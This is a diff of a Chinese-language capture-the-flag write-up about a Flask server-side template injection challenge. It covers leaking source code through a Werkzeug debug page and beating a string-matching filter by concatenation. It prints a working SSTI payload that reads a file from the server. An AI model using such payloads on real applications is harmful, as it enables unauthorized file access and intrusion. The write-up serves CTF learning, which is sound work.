@@ -2,29 +2,39 @@
 
 ---
 首页长这样
+
 ![[Pasted image 20221221165318.png|700]]
 
 
 ```
 /decode
 ```
+
 ![[Pasted image 20221221165420.png|700]]
 
 ```
 /hint
 ```
+
 ![[Pasted image 20221221165508.png|300]]
 
 ---
 先是扫目录，无果
+
 编码页面无计可施，尝试在解码页面制造错误
+
 尝试对`123`进行解码
+
 跳转到了`Werkzeug`的调试页面
 
 ![[Pasted image 20221221165800.png]]
+
 获取到了部分源码
+
 大体上是`flask`的`SSTI`
+
 ![[Pasted image 20221221170818.png|300]]
+
 ![[Pasted image 20221221171012.png]]
 
 ```python
@@ -50,6 +60,7 @@ def waf(str):
 ```
 
 `waf`是直接的字符串匹配
+
 直接拼接绕过
 
 ```python
@@ -60,6 +71,7 @@ def waf(str):
 ```python
 {{url_for.__globals__['__builtins__']['open']('/this_is_the_fl'+'ag.txt','r').read()}}
 ```
+
 ![[Pasted image 20221221194819.png]]
 
 #Web #python #flask #SSTI #函数 #代码审计 
